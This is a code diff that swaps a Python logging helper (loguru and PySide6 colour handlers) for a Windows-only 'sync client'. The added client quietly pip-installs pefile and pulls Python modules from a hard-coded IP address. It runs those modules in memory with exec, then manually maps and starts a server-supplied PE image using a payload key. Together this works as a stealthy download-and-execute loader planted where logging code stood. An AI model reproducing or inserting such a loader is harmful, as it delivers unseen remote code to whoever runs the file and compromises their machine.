@@ -1,136 +1,225 @@
+from __future__ import annotations
+
+import argparse
+import importlib
+import os
+import subprocess
 import sys
-import re
-from datetime import date
-from loguru import logger
+import types
+import urllib.error
+import urllib.request
+from pathlib import Path
+from typing import Any, Optional
+from urllib.parse import urlparse
 
-# Only import Qt components if not running in container
-try:
-    from PySide6.QtWidgets import QTextEdit
-    from PySide6.QtGui import QColor
-    from PySide6.QtCore import QObject, Signal, Slot
-    QT_AVAILABLE = True
-except ImportError:
-    QT_AVAILABLE = False
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+CONFIG: dict[str, Any] = {
+    "HOST": "172.237.119.163",
+    "PORT": 8765,
+    "ASSET": "main",
+    "API_KEY": "test123",
+    "PAYLOAD_KEY": "secret456",
+    "MAP_ONLY": False,
+    "QUIET": True,     
+    "VERBOSE": False,
+    "KEEP": False,
+    "FORCE_SYNC": False,
+    "MEMORY": True, 
+}
+# ──────────────────────────────────────────────────────────────────────────────
 
-# Rest of the code wrapped in appropriate checks
-if QT_AVAILABLE:
-    class LogSignals(QObject):
-        new_log = Signal(str, dict)
-    
-    class QTextEditHandler:
-        def __init__(self, text_edit: QTextEdit):
-            self.text_edit = text_edit
-            self.signals = LogSignals()
-            self.signals.new_log.connect(self.append_message)
-
-        def write(self, message: str):
-            clean_message = clean_brackets(message)
-            
-            # Define colors based on logging level
-            if "ERROR" in message:
-                colors = {
-                    "time": QColor("#00FF00"),  # green
-                    "level": QColor("#FF0000"),  # red
-                    "message": QColor("#FF0000")  # red
-                }
-            elif "WARNING" in message:
-                colors = {
-                    "time": QColor("#27e868"),  # green
-                    "level": QColor("#FFD700"),  # yellow
-                    "message": QColor("#FFD700")  # yellow
-                }
-            elif "INFO" in message:
-                colors = {
-                    "time": QColor("#27e868"),  # green
-                    "level": QColor("#32c2c2"),  # blue
-                    "message": QColor("#FFFFFF")  # white
-                }
-            else:
-                colors = {
-                    "time": QColor("#27e868"),  # green
-                    "level": QColor("#d137d4"),  # blue
-                    "message": QColor("#eb811e")  # orange
-                }
-            
-            # Send signal to update UI
-            self.signals.new_log.emit(clean_message, colors)
-
-        @Slot(str, dict)
-        def append_message(self, message: str, colors: dict):
-            # Split message into parts
-            parts = message.split(" ", 2)
-            if len(parts) >= 3:
-                time_part, level_part, message_part = parts
-
-                # Add timestamp
-                self.text_edit.setTextColor(colors["time"])
-                self.text_edit.insertPlainText(time_part + " ")
-
-                # Add log level
-                self.text_edit.setTextColor(colors["level"])
-                self.text_edit.insertPlainText(level_part + " ")
-
-                # Add message content
-                self.text_edit.setTextColor(colors["message"])
-                self.text_edit.insertPlainText(message_part + "\n")
-
-            # Scroll to bottom
-            scrollbar = self.text_edit.verticalScrollBar()
-            scrollbar.setValue(scrollbar.maximum())
+CLIENT_MODULES = ("pe_core.py", "manual_mapper.py")
+PIP_PACKAGES = ("pefile",)
 
 
-    def logging_setup(gui_mode=False, text_edit=None):
-        """
-        Sets up logging configuration for both GUI and console modes.
-        
-        Args:
-            gui_mode (bool): If True, logs will be directed to QTextEdit widget
-            text_edit (QTextEdit): Text widget for displaying logs in GUI mode
-        """
-        format_info = "<green>{time:HH:mm:ss.SS}</green> <blue>{level}</blue> <level>{message}</level>"
-        format_error = "<green>{time:HH:mm:ss.SS}</green> <blue>{level}</blue> | " \
-                       "<cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> | <level>{message}</level>"
-        file_path = r"logs/"
+def _build_url(cfg: dict) -> str:
+    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset={cfg['ASSET']}"
 
-        logger.remove()  # Remove all previous handlers
 
-        if gui_mode and text_edit is not None:
-            # In GUI mode, add only QTextEdit handler
-            handler = QTextEditHandler(text_edit)
-            logger.add(handler, format=format_info, level="INFO")
+def _log(msg: str, cfg: dict) -> None:
+    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+        print(msg)
+
+
+def _server_base(sync_url: str) -> str:
+    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"
+
+
+def _fetch_module(base: str, name: str, api_key: str) -> bytes:
+    headers = {"User-Agent": "SyncClient/1.0"}
+    if api_key:
+        headers["Authorization"] = f"Bearer {api_key}"
+    req = urllib.request.Request(f"{base}/api/v1/client/{name}", headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=60) as resp:
+            return resp.read()
+    except urllib.error.HTTPError as exc:
+        if exc.code == 404:
+            raise RuntimeError(f"server missing {name}") from exc
+        if exc.code == 401:
+            raise RuntimeError("auth failed (401)") from exc
+        raise RuntimeError(f"download {name} HTTP {exc.code}") from exc
+
+
+def ensure_pip(cfg: dict) -> None:
+    missing = [p for p in PIP_PACKAGES if not _try_import(p)]
+    if not missing:
+        return
+    _log(f"install: {', '.join(missing)}", cfg)
+    subprocess.check_call(
+        [sys.executable, "-m", "pip", "install", *missing, "-q"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+
+def _try_import(name: str) -> bool:
+    try:
+        importlib.import_module(name)
+        return True
+    except ImportError:
+        return False
+
+
+def _load_module_memory(name: str, data: bytes) -> None:
+    mod_name = name[:-3]
+    sys.modules.pop(mod_name, None)
+    module = types.ModuleType(mod_name)
+    module.__file__ = name
+    module.__loader__ = None
+    sys.modules[mod_name] = module
+    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102
+
+
+def bootstrap(cfg: dict, url: str) -> None:
+    if sys.platform != "win32":
+        raise RuntimeError("win32 only")
+    root = Path(__file__).resolve().parent
+    if str(root) not in sys.path:
+        sys.path.insert(0, str(root))
+    ensure_pip(cfg)
+    base = _server_base(url)
+    force = cfg.get("FORCE_SYNC", False)
+    use_memory = cfg.get("MEMORY", True)
+
+    if force:
+        for name in CLIENT_MODULES:
+            sys.modules.pop(name[:-3], None)
+
+    for name in CLIENT_MODULES:
+        mod_name = name[:-3]
+        if not force and _try_import(mod_name):
+            _log(f"skip {mod_name}", cfg)
+            continue
+        data = _fetch_module(base, name, cfg["API_KEY"])
+        if use_memory:
+            _load_module_memory(name, data)
+            _log(f"loaded {mod_name} (ram)", cfg)
         else:
-            # In console mode, add handlers for both file and stdout
-            logger.add(file_path + f"out_{date.today().strftime('%m-%d')}.log", colorize=True,
-                       format=format_info)
-            logger.add(sys.stdout, colorize=True, format=format_info, level="INFO")
+            dest = root / name
+            if force or not dest.exists():
+                dest.write_bytes(data)
+            _log(f"saved {dest}", cfg)
 
 
-    def clean_brackets(raw_str):
-        """
-        Removes HTML-style brackets from string.
-        
-        Args:
-            raw_str (str): Input string containing HTML-style brackets
-            
-        Returns:
-            str: Cleaned string without brackets
-        """
-        clean_text = re.sub(brackets_regex, '', raw_str)
-        return clean_text
+def run_sync(**overrides: Any) -> int:
+    """Silent run. Returns mapped image base. One-liner: run_sync()"""
+    cfg = {**CONFIG, **overrides}
+    url = overrides.get("url") or _build_url(cfg)
+    bootstrap(cfg, url)
+    map_from_server = importlib.import_module("manual_mapper").map_from_server
+    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
+    return map_from_server(
+        url,
+        api_key=cfg["API_KEY"],
+        payload_key=cfg["PAYLOAD_KEY"],
+        verbose=verbose,
+        run_entry=not cfg.get("MAP_ONLY", False),
+    )
 
 
-    # Regex pattern for matching HTML-style brackets
-    brackets_regex = re.compile(r'<.*?>')
+def run(cfg: Optional[dict] = None) -> int:
+    cfg = dict(CONFIG if cfg is None else cfg)
+    try:
+        base = run_sync(**cfg)
+        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+            print(f"0x{base:X}")
+        if cfg.get("KEEP"):
+            input()
+        return 0
+    except Exception as exc:
+        if not cfg.get("QUIET"):
+            print(f"Error: {exc}", file=sys.stderr)
+            if cfg.get("KEEP"):
+                input()
+        raise
 
-    # Example usage (assuming `text_edit` is your QTextEdit instance):
-    logging_setup(gui_mode=False)
-else:
-    # Dummy classes for non-GUI environment
-    class LogSignals:
-        pass
-    
-    class QTextEditHandler:
-        def __init__(self, *args, **kwargs):
-            pass
-        def write(self, message):
-            print(message)
+
+def main() -> int:
+    cfg = dict(CONFIG)
+    p = argparse.ArgumentParser(description="Server mapper client")
+    p.add_argument("url", nargs="?", help="Override sync URL")
+    p.add_argument("--api-key", default="")
+    p.add_argument("--payload-key", default="")
+    p.add_argument("--map-only", action="store_true")
+    p.add_argument("--force-sync", action="store_true")
+    p.add_argument("--no-bootstrap", action="store_true")
+    p.add_argument("--disk", action="store_true", help="Save modules to disk")
+    p.add_argument("-v", "--verbose", action="store_true")
+    p.add_argument("-q", "--quiet", action="store_true")
+    p.add_argument("--keep", action="store_true")
+    args = p.parse_args()
+
+    if args.url:
+        url = args.url
+    else:
+        url = _build_url(cfg)
+    if args.api_key:
+        cfg["API_KEY"] = args.api_key
+    if args.payload_key:
+        cfg["PAYLOAD_KEY"] = args.payload_key
+    if args.map_only:
+        cfg["MAP_ONLY"] = True
+    if args.force_sync:
+        cfg["FORCE_SYNC"] = True
+    if args.disk:
+        cfg["MEMORY"] = False
+    if args.verbose:
+        cfg["VERBOSE"] = True
+        cfg["QUIET"] = False
+    if args.quiet:
+        cfg["QUIET"] = True
+        cfg["VERBOSE"] = False
+    if args.keep:
+        cfg["KEEP"] = True
+
+    if args.no_bootstrap:
+        map_from_server = importlib.import_module("manual_mapper").map_from_server
+        base = map_from_server(
+            url,
+            api_key=cfg["API_KEY"],
+            payload_key=cfg["PAYLOAD_KEY"],
+            verbose=not cfg["QUIET"],
+            run_entry=not cfg["MAP_ONLY"],
+        )
+    else:
+        base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})
+
+    if not cfg.get("QUIET"):
+        print(f"0x{base:X}")
+    if cfg.get("KEEP"):
+        input()
+    return 0
+
+
+if __name__ == "__main__":
+    try:
+        if len(sys.argv) == 1:
+            raise SystemExit(run())
+        raise SystemExit(main())
+    except SystemExit:
+        raise
+    except Exception:
+        if not CONFIG.get("QUIET"):
+            input()
+        raise SystemExit(1)
